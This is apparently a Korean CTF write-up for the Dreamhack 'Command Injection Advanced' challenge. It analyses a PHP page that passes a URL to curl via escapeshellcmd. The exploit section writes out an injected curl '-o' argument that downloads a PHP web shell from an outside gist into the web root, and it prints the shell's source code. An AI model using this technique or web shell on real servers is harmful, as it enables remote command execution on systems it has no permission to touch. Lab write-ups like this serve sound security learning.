# [Dreamhack Wargame] Command Injection Advanced
### [🚩Command Injection Advanced](https://dreamhack.io/wargame/challenges/413/)
<img width="1069" alt="CommandInjectionAdvanced_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/9012fc35-0864-40c2-b060-5054290718a8">

<br/><br/>

## 문제 파일(index.php) 분석
```php
<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
        <div class="card-content">
        <h1 class="title">Online Curl Request</h1>
        <?php
            if(isset($_GET['url'])){
                $url = $_GET['url']; // 사용자가 입력한 url 인자값을 가져옴
            
                // url 입력값이 http로 시작하는지 검사
                if(strpos($url, 'http') !== 0 ){ // http이 포함되어 있지 않은 경우
                    die('http only !');
                }else{ // http이 포함되어 있는 경우
                    // shell_exec 함수를 통해 curl 명령어가 수행됨 (curl의 인자로 url이 전달됨)
                    // → escapeshellcmd 함수를 사용함 (셸 메타문자를 사용할 수 없지만, 명령어의 옵션 또는 인자는 조작할 수 있음)
                    $result = shell_exec('curl '. escapeshellcmd($_GET['url']));
                
                    // url의 값을 MD5 알고리즘으로 해싱한 결과를 파일 이름로 하여 curl 명령어의 실행 결과를 cache 디렉터리에 저장함
                    $cache_file = './cache/'.md5($url);
                    file_put_contents($cache_file, $result);

                    echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
                    echo '<pre>'. htmlentities($result) .'</pre>';
                    return;
                }
            }else{
        ?>
            <form>
                <div class="field">
                    <label class="label">URL</label>
                    <input class="input" type="text" placeholder="url" name="url" required>
                </div>
                <div class="control">
                    <input class="button is-success" type="submit" value="submit">
                </div>
            </form>
        <?php
            }
        ?>
        </div>
        </div>
    </body>
</html>
```

<br/><br/>

## 문제 풀이
## 취약점이 존재하는 부분
```curl``` 명령어의 인자로 ```url```이 전달될 때 ```escapeshellcmd``` 함수를 사용하기 때문에 메타 문자를 사용한 Command Injection은 불가능하지만, 실행하려는 명령어의 옵션 또는 인자는 조작할 수 있음
* ```escapeshellcmd``` 함수는 '-' 문자에는 이스케이프 처리를 하지 않음 → ```curl``` 명령어의 옵션 중 하나인 ```-o```를 사용해 임의 디렉토리에 파일을 생성할 수 있음
    | 옵션 | 설명 |
    |---|-----|
    | -o (--output \<file\>) | stdout 대신에 \<file\>이라는 이름을 가진 파일에 출력을 씀 <br/> &nbsp;&nbsp; - curl 명령어의 실행 결과(방문한 url의 소스코드)가 파일의 내용이 됨 |
    - ```-o``` 옵션을 사용해 임의 위치에 파일을 생성할 수 있는지 확인해야 함
        + 코드를 보면 ```cache``` 디렉터리에 데이터를 쓸 수 있으므로 해당 위치에 파일을 생성하고 생성한 페이지에 접속함
        + 기본적으로 아파치 웹 문서의 파일 경로는 "/var/www/html"이므로 "/var/www/html/cache/test"를 ```-o``` 옵션의 <file>에 입력함
        + 수행 과정
            1. 사이트에서 ```http://127.0.0.1/ -o /var/www/html/cache/test```를 URL에 입력하고 submit 버튼을 누르면 "cache file:"이 화면에 출력됨
                <img width="984" alt="명령어 옵션 test" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/60b43109-8559-42ab-b441-160eac1ceb99">
                <img width="984" alt="명령어 옵션 test 결과" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/355e371e-2bd6-467d-8fc5-5da6b0dec53f">
            2. ```http://host3.dreamhack.games:20849/cache/test```(접속 정보는 문제 사이트에서 확인)에 접속하여 성공적으로 수행되는 것을 확인함
                <img width="984" alt="명령어 옵션 test 사이트 접속" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/60024bec-180c-4cc0-b966-9aaff7cd1dbc">

<br/><br/>

## 익스플로잇
1. 옵션을 조작하여 Command Injection을 수행하여 ```cache``` 디렉터리에 파일을 생성한 후 파일 내용에 명령어를 실행하는 코드를 삽입해 웹 셸 파일을 업로드해야 함
    - curl의 ```-o``` 옵션은 명령어의 실행 결과(방문한 url의 소스코드)를 <file>이란 이름의 파일에 저장함 → 웹 셸 코드가 포함된 웹 페이지의 주소를 명령어의 인자로 전달해 이를 방문하여 해당 내용을 <file> 파일에 저장해야 함
    - 웹 셸 업로드 방법
        1. 개인의 웹 서버에 웹 셸 코드를 올리고 해당 페이지를 방문하는 방법
        2. Github Raw File 링크를 이용하는 방법
            - 드림핵 강의에서 제공하는 [링크](https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php)에 접속해보면 웹 셸 코드를 반환하는 것을 알 수 있음
                ```php
                <html>
                    <body>
                        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
                            <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
                            <input type="SUBMIT" value="Execute">
                        </form>
                        <pre>
                            <?php
                                if(isset($_GET['cmd']))
                                {
                                    system($_GET['cmd']); // system 함수로 <input> 태그에서 입력 받은 명령(cmd)를 실행하고 있음
                                }
                            ?>
                        </pre>
                    </body>
                </html>
                ```
            - 위의 링크를 이용해 사이트에서 ```https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php -o /var/www/html/cache/webshell.php```를 입력해 웹 셸을 업로드함
                <img width="984" alt="익스플로잇 1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/2643a4f5-0c84-4213-9c51-e214b82bd183">
                <img width="984" alt="익스플로잇 1(결과)" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/ce06ca6e-bc9f-4796-b142-19fde5a23fe3">

2. 웹 셸(websehll.php)를 업로드한 후 해당 페이지(```http://host3.dreamhack.games:20849/cache/webshell.php```)에 접속하면 명령어를 실행할 수 있는 페이지가 출력되는 것을 볼 수 있음
    <img width="984" alt="익스플로잇 2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/60c5a1d7-8062-4244-abf7-b6a29dc6f069">

3. ```/flag``` 바이너리에 실행 권한만 있다고 명시되어 있으므로 ```/flag```를 입력하여 해당 파일을 실행해 플래그를 획득함
    <img width="984" alt="익스플로잇 3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/3ba3f4eb-a76d-49df-a4e7-33ba00e324df">
    <img width="984" alt="익스플로잇 3(결과)" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/b3058e93-ce16-4f0e-ad70-587e2a758cba">
    - ```ls -al /``` 명령어를 입력해 실행 권한을 살펴보면 ```/flag```의 권한이 ```---x--x--x```로 되어 있어 실행(x)만 가능하다는 것을 알 수 있음
       <img width="984" alt="flag 실행 권한 확인" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/032b0aaa-383f-44c9-b3e8-a491d1ed3aef">
